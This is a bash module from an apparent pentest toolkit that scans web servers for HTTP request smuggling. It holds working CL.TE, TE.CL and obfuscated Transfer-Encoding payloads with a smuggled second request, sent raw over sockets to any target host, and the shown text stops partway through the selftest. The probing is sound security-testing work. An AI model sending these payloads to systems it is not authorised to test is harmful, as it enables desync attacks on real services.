#!/usr/bin/env bash
# 59_smuggling.sh — cloudsting module 59: the front end and the back end disagree
# Verbs: --probe | --clte | --clcl | --te | --teobfusc | --h2cl | --h2te
#        --downgrade | --desync | --techniques | --list | --status-tsv | --menu
#        | --selftest | --help
set -u
umask 077

# A parent that sourced the core exports CS_MOD_DIR; this module derives its own.
unset CS_MOD_DIR

MODULE_ID="59_smuggling"
MOD_NAME="Request Smuggling (CL.TE, TE.CL, obfuscated TE and H2 desync)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

SM_RUN_ID="$CS_RUN_ID"
export SM_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/smuggling"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${SM_TIMEOUT:=10}"
: "${SM_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/59}"
: "${SM_MARKER:=cloudsting_smuggle}"
: "${SM_PATH:=/}"
: "${SM_HOST_HEADER:=}"

sm_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── the techniques ───────────────────────────────────────────────
# Smuggling is one disagreement: how much of the byte stream belongs to this
# request. Two parsers, two answers. Each row names which header pair disagrees
# and what the attacker gets when it does.
#   <id>\t<layer>\t<what disagrees>\t<what the attacker wins>
sm_techniques() {
    cat <<'TECHNIQUES'
cl-te	http/1.1	Content-Length vs Transfer-Encoding: chunked	the front end reads a length, the back end reads chunks — the tail becomes the next request
te-cl	http/1.1	Transfer-Encoding before Content-Length	the reverse order, which some proxies normalise and some do not
cl-cl	http/1.1	Two Content-Length headers with different values	the first parser trusts one, the second trusts the other
te-te	http/1.1	Two Transfer-Encoding headers	duplicate headers are legal and reconcile differently
te-obfusc	http/1.1	an obfuscated Transfer-Encoding value	"chunked" with a space, a tab, a case shift or a name suffix still parses somewhere
te-space	http/1.1	"Transfer-Encoding : chunked"	the space before the colon makes one parser skip the header entirely
te-null	http/1.1	Transfer-Encoding carrying a null byte	one parser truncates the value at the null and reads nothing
te-identity	http/1.1	chunked followed by identity	the second token confuses the tokeniser
h2-cl	http/2	HTTP/2 body with Content-Length	A downgrade to HTTP/1.1 at the back end reintroduces CL semantics
h2-te	http/2	HTTP/2 with a smuggled Transfer-Encoding	illegal in HTTP/2, honoured after the downgrade
h2-crlf	http/2	CRLF in a header value	HTTP/2 forbids it; the downgrade writes it out as a header
ws-upgrade	http/1.1	Connection: Upgrade with a body	an upgraded connection skips the parser that would have counted the body
pause-desync	timing	a request held open for a second	proves the back end is waiting for a body the front end never sent
TECHNIQUES
}

# The header spellings that make a parser disagree with its neighbour. Each row
# is a complete replacement for the framing headers, applied as raw bytes.
#   <id>\t<raw-headers>
sm_framing() {
    # The separator is a literal \r\n written as a two-byte escape so a shell
    # never eats it: the payload has to reach the wire byte for byte.
    cat <<'FRAMING'
cl-te	Content-Length: 4\r\nTransfer-Encoding: chunked
te-cl	Transfer-Encoding: chunked\r\nContent-Length: 4
cl-cl	Content-Length: 4\r\nContent-Length: 6
te-te	Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
te-space	Transfer-Encoding : chunked\r\nContent-Length: 4
te-tab	Transfer-Encoding:\tchunked\r\nContent-Length: 4
te-case	TrAnSfEr-EnCoDiNg: chunked\r\nContent-Length: 4
te-xchunked	Transfer-Encoding: xchunked\r\nContent-Length: 4
te-chunked-x	Transfer-Encoding: chunkedx\r\nContent-Length: 4
te-null	Transfer-Encoding: chunked\r\nContent-Length: 4
FRAMING
}

# ── the body ─────────────────────────────────────────────────────
# A smuggling payload has two halves: a small body the front end counts and a
# tail the back end reads as a new request. The tail is a GET for a marker path
# so the server's own 404 or the timing tells you it was parsed.
#   sm_body <technique> <marker-path>
#   -> the raw body bytes on stdout
sm_body() {
    local tech="$1" mp="${2:-/$SM_MARKER}"
    case "$tech" in
        cl-te)
            # a complete 4-byte chunked body AND a complete 4-byte CL body: both
            # parsers finish, so only a disagreeing pair leaves a tail behind
            printf '4\r\nabcd\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: x\r\nX: y\r\n\r\n' "$mp"
            ;;
        te-cl)
            printf '4\r\nabcd\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: x\r\nX: y\r\n\r\n' "$mp"
            ;;
        cl-cl)
            printf 'abcd'
            ;;
        te-obf|te-space|te-tab|te-case|te-xchunked|te-chunked-x|te-null|te-identity|te-te)
            printf '4\r\nabcd\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: x\r\nX: y\r\n\r\n' "$mp"
            ;;
        ws-upgrade)
            printf '4\r\nabcd\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: x\r\nX: y\r\n\r\n' "$mp"
            ;;
        *)
            printf 'abcd'
            ;;
    esac
}

# The bytes on the wire. curl will not let a caller forge framing headers, so the
# request is written straight to a socket with bash's /dev/tcp, which every bash
# has and which sends exactly what it is given.
#   sm_send_raw <host> <port> <tls:0|1> <raw-request-text>
#   -> code \x1f bytes \x1f time \x1f body-path
sm_send_raw() {
    local host="$1" port="$2" tls="$3" raw="$4"
    local out; out="$(mktemp "$CS_SCRATCH/sm.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.sm.$$"

    if (( tls == 1 )); then
        # certificate handling belongs to openssl, and it can hold a socket
        # open long enough to see whether the far end is still parsing
        printf '%s' "$raw" | timeout "$SM_TIMEOUT" \
            openssl s_client -quiet -connect "${host}:${port}" -servername "$host" \
            > "$out" 2>/dev/null
        local rc=$?
        local bytes; bytes="$(wc -c < "$out" 2>/dev/null | tr -d ' ')"
        printf '%s\037%s\037%s\037%s\n' "$(( rc == 0 ? 200 : 0 ))" "${bytes:-0}" "0" "$out"
        return
    fi

    local start; start="$(date +%s%N)"
    # the request travels as a file, not as a shell word: a smuggled body holds
    # NUL bytes and CRLF runs that a %b expansion would mangle, and a quoted
    # heredoc word survives bash's own NUL stripping
    local reqf="${out}.req"
    printf '%b' "$raw" > "$reqf" 2>/dev/null || printf '%s' "$raw" > "$reqf"
    timeout "$SM_TIMEOUT" bash -c '
        exec 3<>"/dev/tcp/$1/$2" || exit 4
        cat "$3" >&3
        cat <&3
    ' _ "$host" "$port" "$reqf" > "$out" 2>/dev/null
    local rc=$?
    rm -f "$reqf"
    local stop; stop="$(date +%s%N)"
    local ms=$(( (stop - start) / 1000000 ))
    local bytes; bytes="$(wc -c < "$out" 2>/dev/null | tr -d ' ')"
    # 124 is the timeout, which is itself the finding for a pause desync
    printf '%s\037%s\037%s\037%s\n' "$rc" "${bytes:-0}" "$ms" "$out"
}

# Build the full request from its parts. Every line ends CRLF because that is
# the wire format; `%b` in the sender expands the escapes.
#   sm_request <method> <path> <headers-raw> <body>
sm_request() {
    local method="$1" path="$2" headers="$3" body="${4:-}"
    printf '%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n%s\r\nConnection: close\r\n\r\n%s' \
        "$method" "$path" "${SM_HOST_HEADER:-localhost}" "$SM_UA" "$headers" "$body"
}

# The liveness test. Every technique below announces a body; if the far end
# ignores framing headers entirely it simply waits, and a wait looks exactly like
# a desync. So the control sends a request every parser agrees is complete — no
# Transfer-Encoding, a correct Content-Length — and the probe only runs when that
# control answered.
#   sm_control_body -> "abcd" with Content-Length: 4
sm_control_headers() { printf 'Content-Length: 4\r\nContent-Type: application/x-www-form-urlencoded'; }

# ── the evidence ─────────────────────────────────────────────────
# Three signals, in order of strength:
#   1. the marker path appears in a response we did not ask for — the tail was
#      parsed as a request and answered
#   2. a timeout where a normal request answers instantly — the back end is
#      waiting for a body that will never come
#   3. an error string from the wrong parser ("invalid chunk size") on a
#      request the front end accepted
sm_response_has_marker() {
    local body="$1" marker="$2"
    [[ -f "$body" ]] || { printf '0'; return; }
    grep -qaF -- "$marker" "$body" 2>/dev/null && printf '1' || printf '0'
}

sm_response_error() {
    local body="$1" m
    [[ -f "$body" ]] || { printf '0'; return; }
    while IFS= read -r m; do
        [[ -z "$m" ]] && continue
        grep -qaiF -- "$m" "$body" 2>/dev/null && { printf '1'; return; }
    done <<'ERRS'
invalid chunk
chunk size
Bad Request
malformed
Invalid header
400 Bad request
header field
invalid character
protocol violation
unexpected end of
upstream prematurely
request line
ERRS
    printf '0'
}

# The verdict. A smuggling vulnerability has to survive the control: a server
# that times out on everything, or answers 400 to everything, proves nothing.
#   sm_verdict <control-ms> <control-code> <probe-rc> <probe-ms>
#              <probe-marker> <probe-error>
sm_verdict() {
    local cms="$1" ccode="$2" prc="$3" pms="$4" marker="$5" err="$6"
    [[ "$ccode" == "0" ]] && { printf 'unreachable'; return; }
    # the control itself was slow: every later delay is the app, not the parser
    if (( cms > 2000 )); then printf 'control-slow'; return; fi
    if [[ "$marker" == "1" ]]; then printf 'desync-marker'; return; fi
    if [[ "$prc" == "124" ]]; then
        if (( pms > cms + 3000 )); then printf 'held-open'; return; fi
        printf 'timeout'; return
    fi
    if [[ "$err" == "1" && "$ccode" -ge 200 && "$ccode" -lt 300 ]]; then
        printf 'parser-error'; return
    fi
    printf 'clean'
}

# ── verbs ────────────────────────────────────────────────────────

# --probe <host[:port]> [path]: the control, then every framing pair on the
# same request. This is the verb that answers "is this gateway smuggled".
sm_cmd_probe() {
    local target="${1:-}" path="${2:-$SM_PATH}"
    [[ -z "$target" ]] && { sm_log "usage: --probe <host[:port]> [path]"; return 2; }
    local tls=1
    local host="$target" port="443"
    case "$target" in
        https://*) tls=1; host="${target#https://}"; host="${host%%/*}" ;;
        http://*)  tls=0; host="${target#http://}";  host="${host%%/*}" ;;
    esac
    case "$host" in
        *:*) port="${host##*:}"; host="${host%%:*}" ;;
        *)   (( tls == 1 )) && port=443 || port=80 ;;
    esac
    SM_HOST_HEADER="$host"

    cs_row TARGET "${host}:${port}"
    cs_row TLS "$( (( tls == 1 )) && echo on || echo off )"
    cs_row PATH "$path"

    # control: a complete framed POST, so a server that ignores framing headers
    # is caught here instead of being reported as vulnerable below
    local ctrl; ctrl="$(sm_request POST "$path" "$(sm_control_headers)" 'abcd')"
    local c_rc c_bytes c_ms c_body
    cs_split "$(sm_send_raw "$host" "$port" "$tls" "$ctrl")" c_rc c_bytes c_ms c_body
    local c_code="0"
    [[ "$c_rc" == "0" && "${c_bytes:-0}" -gt 0 ]] && c_code="200"
    local c_err; c_err="$(sm_response_error "$c_body")"
    rm -f "$c_body"
    cs_row CONTROL "rc=$c_rc" "bytes=$c_bytes" "ms=$c_ms" "error=$c_err"

    if [[ "$c_code" == "0" ]]; then
        # a raw socket cannot speak https; say so instead of pretending
        cs_row VERDICT "unreachable" "the plain request got no answer on this socket"
        if (( tls == 1 )); then
            cs_row NOTE "TLS probes go through openssl s_client; a closed port looks the same as a refused handshake"
        fi
        cs_row SUMMARY "techniques=0 desync=0"
        return 3
    fi

    : > "$HIT_FILE"
    local tech layer disagrees wins
    local tried=0 hits=0
    HELD_COUNT=0
    local marker_path="/$SM_MARKER"
    TMPS=()
    while IFS=$'\t' read -r tech layer disagrees wins; do
        [[ -z "$tech" ]] && continue
        # h2 rows need an HTTP/2 client; they are reported as skipped, not failed
        case "$layer" in
            http/2)
                cs_row SKIP "$tech" "http/2 framing needs a downgrade path; run --h2cl or --h2te"
                continue
                ;;
            timing)
                continue
                ;;
        esac
        tried=$((tried + 1))

        local framing; framing="$(sm_framing | awk -F'\t' -v id="$tech" '$1==id{print $2}')"
        [[ -z "$framing" ]] && framing="Transfer-Encoding: chunked\r\nContent-Length: 4"
        local body; body="$(sm_body "$tech" "$marker_path")"
        local req; req="$(sm_request POST "$path" "$framing" "$body")"
        local p_rc p_bytes p_ms p_body
        cs_split "$(sm_send_raw "$host" "$port" "$tls" "$req")" p_rc p_bytes p_ms p_body
        local p_marker p_err
        p_marker="$(sm_response_has_marker "$p_body" "$SM_MARKER")"
        p_err="$(sm_response_error "$p_body")"
        rm -f "$p_body"

        local verdict; verdict="$(sm_verdict "$c_ms" "$c_code" "$p_rc" "$p_ms" "$p_marker" "$p_err")"
        printf 'tech\t%s\t%s\t%s\t%s\t%s\n' "$tech" "$p_rc" "$p_ms" "$verdict" "$p_marker" >> "$PROBE_FILE"

        case "$verdict" in
            desync-marker)
                hits=$((hits + 1))
                cs_row HIT "$tech" "ms=$p_ms" "the tail became a second request"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${host}:${port}" "CRITICAL" "smuggle-$tech" \
                    "$disagrees — the smuggled tail was answered ($wins)"
                ;;
            held-open)
                HELD_COUNT=$(( ${HELD_COUNT:-0} + 1 ))
                # the far end waited, which only says it lost track of the body
                # it was promised; the pair is a lead, not a proven desync
                cs_row HELD "$tech" "ms=$p_ms" "the far end waited $((p_ms - c_ms))ms past a ${c_ms}ms control"
                cs_row NOTE "$tech" "a wait means the body was not consumed as framed — confirm with an interleaved request before calling it a desync"
                ;;
            parser-error)
                hits=$((hits + 1))
                cs_row HIT "$tech" "ms=$p_ms" "the back-end parser complained through the front end"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${host}:${port}" "HIGH" "smuggle-parser-$tech" \
                    "$disagrees — the front end accepted a framing the back end rejected"
                ;;
            clean)
                cs_row TECH "$tech" "ms=$p_ms" "$verdict"
                ;;
            *)
                cs_row TECH "$tech" "ms=$p_ms" "$verdict"
                ;;
        esac
    done < <(sm_techniques)

    local overall="clean"
    (( hits > 0 )) && overall="desync"
    local held="$HELD_COUNT"
    cs_row VERDICT "$overall" "$hits of $tried techniques"
    cs_row SUMMARY "techniques=$tried desync=$hits held-open=${held:-0}"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    return 0
}

# --clte <host[:port]> [path]: the classic pair, one technique, full evidence.
sm_cmd_clte() { sm_one_technique "${1:-}" "${2:-$SM_PATH}" cl-te; }

# --clcl <host[:port]> [path]: duplicate Content-Length with different values.
sm_cmd_clcl() { sm_one_technique "${1:-}" "${2:-$SM_PATH}" cl-cl; }

# --te <host[:port]> [path]: te-cl and every obfuscation of the header.
sm_cmd_te() { sm_one_technique "${1:-}" "${2:-$SM_PATH}" te-cl; }

sm_cmd_teobfusc() {
    local target="${1:-}" path="${2:-$SM_PATH}"
    [[ -z "$target" ]] && { sm_log "usage: --teobfusc <host[:port]> [path]"; return 2; }
    cs_row TARGET "$target"
    local id framing
    while IFS=$'\t' read -r id framing; do
        [[ -z "$id" ]] && continue
        case "$id" in te-cl|cl-te|cl-cl) continue ;; esac
        cs_row OBFR "Transfer-Encoding $id" "$framing"
    done < <(sm_framing)
    cs_row NOTE "run --probe to send these; this verb only lists what would be sent"
    cs_row SUMMARY "obfuscations=$(sm_framing | grep -vc -E '^(te-cl|cl-te|cl-cl)')"
    return 0
}

# One technique, with the full request and response kept as artifacts.
sm_one_technique() {
    local target="$1" path="${2:-$SM_PATH}" tech="${3:-cl-te}"
    [[ -z "$target" ]] && { sm_log "usage: <verb> <host[:port]> [path]"; return 2; }
    local tls=1
    local host="$target" port="443"
    case "$target" in
        https://*) tls=1; host="${target#https://}"; host="${host%%/*}" ;;
        http://*)  tls=0; host="${target#http://}";  host="${host%%/*}" ;;
    esac
    case "$host" in
        *:*) port="${host##*:}"; host="${host%%:*}" ;;
        *)   (( tls == 1 )) && port=443 || port=80 ;;
    esac
    SM_HOST_HEADER="$host"
    cs_row TARGET "${host}:${port}"
    cs_row TECHNIQUE "$tech"

    local framing; framing="$(sm_framing | awk -F'\t' -v id="$tech" '$1==id{print $2}')"
    [[ -z "$framing" ]] && { cs_row ERROR "unknown technique: $tech"; return 2; }
    local body; body="$(sm_body "$tech" "/$SM_MARKER")"
    local req; req="$(sm_request POST "$path" "$framing" "$body")"

    # keep the exact bytes, because a report that cannot reproduce is a rumour
    local reqf="$OUT_DIR/request-$tech-$RUN_ID.txt"
    printf '%b' "$req" > "$reqf"; chmod 600 "$reqf" 2>/dev/null || true
    cs_row REQUEST "$reqf" "$(wc -c < "$reqf" | tr -d ' ') bytes"

    local ctrl; ctrl="$(sm_request GET "$path" 'Content-Length: 0')"
    local _c_rc _c_b c_ms c_body
    cs_split "$(sm_send_raw "$host" "$port" "$tls" "$ctrl")" _c_rc _c_b c_ms c_body
    rm -f "$c_body"

    local p_rc p_bytes p_ms p_body
    cs_split "$(sm_send_raw "$host" "$port" "$tls" "$req")" p_rc p_bytes p_ms p_body
    local p_marker p_err
    p_marker="$(sm_response_has_marker "$p_body" "$SM_MARKER")"
    p_err="$(sm_response_error "$p_body")"
    rm -f "$p_body"

    cs_row CONTROL "ms=$c_ms"
    cs_row PROBE "rc=$p_rc" "bytes=$p_bytes" "ms=$p_ms" "marker=$p_marker" "error=$p_err"
    local verdict; verdict="$(sm_verdict "$c_ms" 200 "$p_rc" "$p_ms" "$p_marker" "$p_err")"
    cs_row VERDICT "$verdict"
    [[ "$verdict" != "clean" && "$verdict" != "unreachable" ]] && \
        cs_findings_row "$MODULE_ID" "WEBAPI" "${host}:${port}" "HIGH" "smuggle-$tech" \
            "$tech: $verdict (control ${c_ms}ms, probe ${p_ms}ms)"
    cs_row SUMMARY "technique=$tech verdict=$verdict"
    return 0
}

# --h2cl / --h2te <host[:port]>: an HTTP/2 front end that downgrades to HTTP/1.1
# at the back end reintroduces CL semantics after the h2 layer has removed them.
# curl speaks h2 when it can, and a header named content-length or
# transfer-encoding on an h2 request is the smuggle itself.
sm_cmd_h2() {
    local which="${1:-cl}" target="${2:-}" path="${3:-$SM_PATH}"
    [[ -z "$target" ]] && { sm_log "usage: --h2cl|--h2te <host[:port]> [path]"; return 2; }
    local url="$target"
    [[ "$url" == http*://* ]] || url="https://$url"
    url="${url%/}${path}"

    cs_row TARGET "$url"
    cs_row LAYER "http/2"

    local -a hdrs
    case "$which" in
        te) hdrs=(-H 'Transfer-Encoding: chunked') ;;
        *)  hdrs=(-H 'Content-Length: 4') ;;
    esac
    # curl refuses to send these on h2 and will silently drop them unless the
    # request is forced down to 1.1, so the probe records what curl actually did
    local out; out="$(mktemp "$CS_SCRATCH/sm-h2.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.h2.$$"
    local meta
    meta="$(curl -s -o "$out" --max-time "$SM_TIMEOUT" --http2 -A "$SM_UA" \
                 "${hdrs[@]}" --data-binary 'abcd' \
                 --write-out '%{http_code}\t%{http_version}\t%{size_download}\t%{time_total}' \
                 "$url" 2>/dev/null)" || meta=""
    local code ver bytes tm
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code ver bytes tm <<<"$meta" ;;
        *) code="000"; ver="-"; bytes="0"; tm="0" ;;
    esac
    cs_row RESPONSE "code=$code" "http_version=$ver" "bytes=$bytes" "time=$tm"

    # the only honest verdict: what version did we actually speak
    case "$ver" in
        2|2.0) cs_row VERDICT "h2-spoken" "the front end accepted HTTP/2; framing headers are illegal here and are the smuggle" ;;
        1.1|1.0) cs_row VERDICT "downgraded" "the front end fell back to $ver — CL and TE framing applies directly" ;;
        *) cs_row VERDICT "unknown" "no protocol version reported" ;;
    esac

    if [[ "$code" == "000" ]]; then
        cs_row SUMMARY "unreachable"
        return 3
    fi
    # a 400 that names the framing header is the front end refusing the smuggle,
    # which is worth recording as the fix, not as a hit
    local err; err="$(sm_response_error "$out")"
    rm -f "$out"
    [[ "$err" == "1" ]] && cs_row NOTE "the server rejected the request at the framing layer"
    cs_row SUMMARY "layer=http/2 code=$code version=$ver"
    return 0
}

sm_cmd_h2cl() { shift; sm_cmd_h2 cl "$@"; }
sm_cmd_h2te() { shift; sm_cmd_h2 te "$@"; }

# --downgrade <host[:port]> [path]: does the front end answer h2 and then speak
# 1.1 to the back end. The tell is a response header that only a downgrade adds.
sm_cmd_downgrade() {
    local target="${1:-}" path="${2:-$SM_PATH}"
    [[ -z "$target" ]] && { sm_log "usage: --downgrade <host[:port]> [path]"; return 2; }
    local url="$target"
    [[ "$url" == http*://* ]] || url="https://$url"
    url="${url%/}${path}"
    cs_row TARGET "$url"

    local -a versions=(--http2 --http1.1)
    local v
    for v in "${versions[@]}"; do
        local out; out="$(mktemp "$CS_SCRATCH/sm-dg.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.dg.$$"
        local meta
        meta="$(curl -s -o "$out" -D "${out}.hdr" --max-time "$SM_TIMEOUT" -A "$SM_UA" "$v" \
                     --write-out '%{http_code}\t%{http_version}' "$url" 2>/dev/null)" || meta=""
        local code ver
        case "$meta" in
            [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code ver <<<"$meta" ;;
            *) code="000"; ver="-" ;;
        esac
        local server via
        server="$(grep -i '^server:' "${out}.hdr" 2>/dev/null | head -1 | cut -d: -f2- | tr -d '\r' | sed 's/^ *//')"
        via="$(grep -i '^via:' "${out}.hdr" 2>/dev/null | head -1 | cut -d: -f2- | tr -d '\r' | sed 's/^ *//')"
        cs_row VERSION "requested=$v" "code=$code" "answered=$ver" "server=${server:--}" "via=${via:--}"
        rm -f "$out" "${out}.hdr"
    done
    cs_row NOTE "a front end that answers h2 and names a downgrading proxy in Via is the pair smuggling needs"
    cs_row SUMMARY "versions=2"
    return 0
}

# --desync <host[:port]> [path]: the pause test. A request announces a body and
# then never sends it; a back end that keeps the connection waiting is the one
# the next request will be prepended to.
sm_cmd_desync() {
    local target="${1:-}" path="${2:-$SM_PATH}"
    [[ -z "$target" ]] && { sm_log "usage: --desync <host[:port]> [path]"; return 2; }
    local tls=1
    local host="$target" port="443"
    case "$target" in
        https://*) tls=1; host="${target#https://}"; host="${host%%/*}" ;;
        http://*)  tls=0; host="${target#http://}";  host="${host%%/*}" ;;
    esac
    case "$host" in
        *:*) port="${host##*:}"; host="${host%%:*}" ;;
        *)   (( tls == 1 )) && port=443 || port=80 ;;
    esac
    SM_HOST_HEADER="$host"
    cs_row TARGET "${host}:${port}"

    local ctrl; ctrl="$(sm_request GET "$path" 'Content-Length: 0')"
    local _a _b c_ms c_body
    cs_split "$(sm_send_raw "$host" "$port" "$tls" "$ctrl")" _a _b c_ms c_body
    rm -f "$c_body"
    cs_row CONTROL "ms=$c_ms"

    # announce 10 bytes, send none, then close: the wait is the evidence
    local req; req="$(sm_request POST "$path" 'Content-Length: 10')"
    local start; start="$(date +%s%N)"
    local out; out="$(mktemp "$CS_SCRATCH/sm-ds.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.ds.$$"
    if (( tls == 1 )); then
        printf '%b' "$req" | timeout "$SM_TIMEOUT" \
            openssl s_client -quiet -connect "${host}:${port}" -servername "$host" \
            > "$out" 2>/dev/null
    else
        printf '%b' "$req" | timeout "$SM_TIMEOUT" bash -c '
            exec 3<>"/dev/tcp/$1/$2" || exit 4
            cat >&3
            cat <&3
        ' _ "$host" "$port" > "$out" 2>/dev/null
    fi
    local rc=$?
    local stop; stop="$(date +%s%N)"
    local ms=$(( (stop - start) / 1000000 ))
    rm -f "$out"

    cs_row PAUSE "rc=$rc" "ms=$ms"
    local verdict="clean"
    if [[ "$rc" == "124" ]]; then
        verdict="held-open"
    elif (( ms > c_ms + 3000 )); then
        verdict="delayed"
    fi
    cs_row VERDICT "$verdict"
    [[ "$verdict" != "clean" ]] && \
        cs_findings_row "$MODULE_ID" "WEBAPI" "${host}:${port}" "HIGH" "desync-pause" \
            "the back end held a connection open for a declared body that never arrived (${ms}ms vs ${c_ms}ms)"
    cs_row SUMMARY "pause=$verdict control=${c_ms}ms probe=${ms}ms"
    return 0
}

sm_cmd_techniques() {
    local t layer dis wins
    while IFS=$'\t' read -r t layer dis wins; do
        [[ -z "$t" ]] && continue
        cs_row TECHNIQUE "$t" "$layer" "$dis" "$wins"
    done < <(sm_techniques)
    cs_row SUMMARY "techniques=$(sm_techniques | wc -l | tr -d ' ')"
    return 0
}

sm_cmd_framing() {
    local id raw
    while IFS=$'\t' read -r id raw; do
        [[ -z "$id" ]] && continue
        cs_row FRAMING "$id" "$raw"
    done < <(sm_framing)
    cs_row SUMMARY "pairs=$(sm_framing | wc -l | tr -d ' ')"
    return 0
}

sm_cmd_list() { sm_cmd_techniques; }

sm_cmd_status_tsv() {
    local bash_tcp="no"
    # /dev/tcp is a compile-time bash feature, and connecting to a closed port
    # fails either way — so the test is the *error text*: a shell without the
    # feature says "No such file or directory", a refused connection says
    # "Connection refused"
    local probe_err
    probe_err="$( ( exec 3<>/dev/tcp/127.0.0.1/9 ) 2>&1 )"
    case "$probe_err" in
        *"Connection refused"*|*"Network is unreachable"*|*"timed out"*) bash_tcp="yes" ;;
    esac
    command -v openssl >/dev/null 2>&1 && openssl_state="openssl-ok" || openssl_state="openssl-missing"
    printf '%s\t%s\t%s\t%s\ttechniques-%s\tpairs-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "tcp-$bash_tcp" "$openssl_state" \
        "$(sm_techniques | wc -l | tr -d ' ')" "$(sm_framing | wc -l | tr -d ' ')"
}

sm_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

sm_cmd_help() {
    cat <<'HELP'
cloudsting module 59 — Request Smuggling v1.0.0
  --probe <host[:port]> [path]     control, then every 1.1 framing pair on one request
  --clte <host[:port]> [path]      Content-Length vs Transfer-Encoding, full evidence
  --clcl <host[:port]> [path]      two Content-Length values
  --te <host[:port]> [path]        Transfer-Encoding before Content-Length
  --teobfusc <host[:port]>         every obfuscation of the header, listed
  --h2cl <host[:port]> [path]      is Content-Length even legal after an h2 front end
  --h2te <host[:port]> [path]      a smuggled Transfer-Encoding on an h2 request
  --downgrade <host[:port]> [path] does h2 at the edge become 1.1 at the back
  --desync <host[:port]> [path]    hold a declared body open and watch the wait
  --techniques | --framing | --list
  --status-tsv | --menu | --selftest | --help

Requests are written straight to a socket, because a client library will not
let a caller forge framing headers and a smuggled request has to be byte-exact.
The control is always the same request with a sane body: a server that is slow
or angry on everything is reported as control-slow, never as a desync.

TLS probes go through openssl s_client. A port that refuses looks identical to a
port that never answers, and the module says unreachable rather than inventing a
finding.

Environment: SM_TIMEOUT (10), SM_MARKER, SM_PATH, SM_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
sm_selftest() {
    cs_selftest_reset

    local n; n="$(sm_techniques | wc -l | tr -d ' ')"
    chk tech-many    "$( (( n >= 12 )) && echo many || echo few )" "many"
    chk tech-4col    "$(sm_techniques | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk tech-unique  "$(sm_techniques | cut -f1 | sort -u | wc -l | tr -d ' ')" "$n"
    chk tech-layers  "$(sm_techniques | awk -F'\t' '$2 !~ /^(http\/1\.1|http\/2|timing)$/{c++} END{print c+0}')" "0"

    local f; f="$(sm_framing | wc -l | tr -d ' ')"
    chk fram-many    "$( (( f >= 9 )) && echo many || echo few )" "many"
    chk fram-2col    "$(sm_framing | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
    chk fram-clte    "$(sm_framing | awk -F'\t' '$1=="cl-te"{print $2}')" 'Content-Length: 4\r\nTransfer-Encoding: chunked'
    chk fram-tecl    "$(sm_framing | awk -F'\t' '$1=="te-cl"{print $2}')" 'Transfer-Encoding: chunked\r\nContent-Length: 4'
    chk fram-space   "$(sm_framing | awk -F'\t' '$1=="te-space"{print $2}' | grep -c ' : ')" "1"

    # bodies carry the tail that becomes the second request
    chk body-clte    "$(sm_body cl-te '/x' | grep -c 'GET /x HTTP/1.1')" "1"
    chk body-tecl    "$(sm_body te-cl '/x' | grep -c 'GET /x HTTP/1.1')" "1"
    chk body-clcl    "$(sm_body cl-cl '/x')" "abcd"
    chk body-nomark  "$(sm_body cl-te '/x' | grep -c 'Host: x')" "1"

    # a request is CRLF-framed and names the host
    local req; req="$(sm_request GET / 'Content-Length: 0')"
    # the request already holds real CR bytes, so the assertions must not go
    # through line-oriented tools that stop at the first \r
    chk req-line     "$(printf '%s' "$req" | head -c 14)" "GET / HTTP/1.1"
    chk req-host     "$(printf '%s' "$req" | grep -ac 'Host:')" "1"
    chk req-crlf     "$(printf '%s' "$req" | tr -cd '\r' | wc -c | tr -d ' ')" "6"
    chk req-ends     "$(printf '%s' "$req" | tail -c 3 | od -An -tx1 | tr -d ' \n')" "0d0a0d"

    # marker and error detection on real files
    local t; t="$(mktemp "$CS_SCRATCH/sm-mark.XXXXXX")" 2>/dev/null || t="$OUT_DIR/.mk.$$"
    printf 'the path /cloudsting_smuggle was requested\n' > "$t"
    chk mk-seen      "$(sm_response_has_marker "$t" cloudsting_smuggle)" "1"
    chk mk-absent    "$(sm_response_has_marker "$t" not_there_)" "0"
    chk mk-nofile    "$(sm_response_has_marker "$t.nope" x)" "0"
    printf 'HTTP/1.1 400 Bad Request\r\ninvalid chunk size\r\n' > "$t"
    chk mk-error     "$(sm_response_error "$t")" "1"
    printf 'HTTP/1.1 200 OK\r\n\r\neverything fine\n' > "$t"
    chk mk-clean     "$(sm_response_error "$t")" "0"
    rm -f "$t"

    # verdict table
    chk v-unreach    "$(sm_verdict 10 0 0 0 0 0)" "unreachable"
    chk v-control    "$(sm_verdict 5000 200 0 9000 0 0)" "control-slow"
    chk v-marker     "$(sm_verdict 10 200 0 20 1 0)" "desync-marker"
    chk v-pause      "$(sm_verdict 10 200 124 6000 0 0)" "held-open"
    chk v-timeout    "$(sm_verdict 10 200 124 200 0 0)" "timeout"
    chk v-parser     "$(sm_verdict 10 200 0 20 0 1)" "parser-error"
    chk v-clean      "$(sm_verdict 10 200 0 20 0 0)" "clean"

    # a dead port must be unreachable, not a finding
    local out; out="$(sm_cmd_probe 127.0.0.1:9 2>/dev/null)"
